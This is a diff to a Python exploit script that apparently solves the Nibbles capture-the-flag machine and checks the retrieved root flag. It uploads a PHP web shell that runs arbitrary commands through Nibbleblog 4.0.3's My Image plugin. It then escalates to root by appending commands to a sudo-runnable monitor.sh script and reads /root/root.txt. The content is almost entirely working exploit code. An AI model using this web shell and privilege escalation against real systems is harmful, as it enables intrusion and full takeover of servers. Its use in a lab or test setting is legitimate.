@@ -33,6 +33,15 @@ def run_php(command):
     return output
 
 
+def append_monitor(content):
+    query = urllib.parse.urlencode({"append": content})
+    status, output = req(
+        "/nibbleblog/content/private/plugins/my_image/image.php?" + query
+    )
+    assert status == 200 and "APPENDED" in output, output
+    return output
+
+
 host = urllib.parse.urlsplit(BASE).hostname
 with socket.create_connection((host, 22), timeout=5) as sock:
     banner = sock.recv(180)
@@ -71,7 +80,8 @@ print("PASS: recon, authentic Nibbleblog 4.0.3 login and native My Image plugin 
 boundary = "----nibbles-independent-player-boundary"
 payload = (
     b'<?php '
-    b'if (isset($_GET["cmd"])) { passthru($_GET["cmd"]); } '
+    b'if (isset($_GET["append"])) { echo file_put_contents("/home/nibbler/personal/stuff/monitor.sh", $_GET["append"], FILE_APPEND) ? "APPENDED" : "WRITE_FAILED"; } '
+    b'elseif (isset($_GET["cmd"])) { passthru($_GET["cmd"]); } '
     b'else { echo "NIBBLES_REAL_UPLOAD_EXEC"; } '
     b'?>'
 )
@@ -113,19 +123,18 @@ output = run_php(
 )
 assert "monitor.sh" in output and "NOPASSWD" in output, output
 
-command = (
-    "echo '/usr/bin/id > /tmp/nibbles-native-root-proof' >> /home/nibbler/personal/stuff/monitor.sh; "
-    "echo '/usr/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer' >> /home/nibbler/personal/stuff/monitor.sh; "
-    "echo '/bin/chmod 0644 /tmp/nibbles-native-root-answer' >> /home/nibbler/personal/stuff/monitor.sh; "
-    "echo MONITOR_SCRIPT; ls -l /home/nibbler/personal/stuff/monitor.sh; "
-    "wc -c /home/nibbler/personal/stuff/monitor.sh; "
-    "cat /home/nibbler/personal/stuff/monitor.sh; "
+root_lines = [
+    "/usr/bin/id > /tmp/nibbles-native-root-proof",
+    "/bin/cat /root/root.txt > /tmp/nibbles-native-root-answer",
+    "/bin/chmod 0644 /tmp/nibbles-native-root-answer",
+]
+append_monitor("\\n" + "\\n".join(root_lines) + "\\n")
+root_output = run_php(
     "sudo -n /home/nibbler/personal/stuff/monitor.sh 2>&1; "
     "echo SUDO_STATUS:$?; "
     "echo ROOT_PROOF; cat /tmp/nibbles-native-root-proof 2>&1; "
     "echo ROOT_ANSWER; cat /tmp/nibbles-native-root-answer 2>&1"
 )
-root_output = run_php(command)
 assert "uid=0(root)" in root_output, root_output
 root_flag = root_output.split("ROOT_ANSWER", 1)[1].strip().splitlines()[-1]
 assert root_flag == EXPECTED_ROOT_FLAG, "Exact per-instance Root Flag mismatch"
